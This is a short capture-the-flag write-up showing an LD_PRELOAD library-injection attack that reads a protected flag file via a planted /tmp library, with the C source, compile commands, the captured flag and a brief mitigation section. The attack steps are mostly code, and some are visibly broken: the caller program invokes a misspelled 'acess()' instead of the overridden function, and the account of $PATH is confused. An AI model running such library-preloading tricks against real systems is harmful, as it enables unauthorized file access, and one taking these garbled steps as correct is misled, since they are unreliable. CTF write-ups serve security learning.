# CTF 4

The main goal of this exploit was to, using environmental variables, be able to access a file that, other way, would have denied access. The main strategy here is to, instead of simply creating a script to read the file that has the flag, we create a library which is defined in the environmental variable $PATH. With that, we can capture the flag.

## Step 1. The environmental variables

The first step is to preload the future library in the list of environmental variables.

```sh
echo 'LD_PRELOAD=/tmp/lib PATH=/tmp' > env 
```

We will also create the file that will have the output in the tmp folder and give it all the permission.

```sh
touch output.txt 
chmod 777 output.txt 
```

## Step 2. Creation of the library

The second step is to create the library itself (also in the tmp folder). This library is responsible for acessing the file and put the output (the flag) in another file (output.txt).

```sh
cat > lib.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int access ()
{
    system("/bin/cat /flags/flag.txt > /tmp/output.txt");
    return 0;
}
```

This command will create a file lib.c that will access the file and print it to other file

### Step 2.1. The Compilation

Now, this file that we created have to be compiled as a library and give it all the permissions:

```sh
gcc -fPIC -g -c lib.c 
gcc -shared -o lib lib.o -lc
chmod 777 lib
```

## Step 3. The Execution

Now, with the library that have all the permissions, we need to execute it. For that, we need to create a c script that call this library and, with that, be able to get the flag.

```sh
cat > exec.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main ()
{
    acess();
    return 0;
}
```

Now it is time to compile and execute:

```SHELL
gcc exec.c -o exec
./exec
```
## Step 4. The Output

And the final output in the output.txt is:

**flag{c26b13e1f19414fd9a50a0e37197382c}**


## The Explored Vulnerability

- The vulnerability that was exploited is the fact that the /tmp folder had very open privileges (such that any process could write to it). This allowed the attacker to create a library in /tmp that could be preloaded into other programs, giving the attacker the ability to execute arbitrary code.

## What could be used to avoid this Vulnerability

- To make this system more secure, the programmer should restrict the privileges on the /tmp folder so that only authorized users can write to it. Additionally, the programmer should avoid using libraries in /tmp unless absolutely necessary.

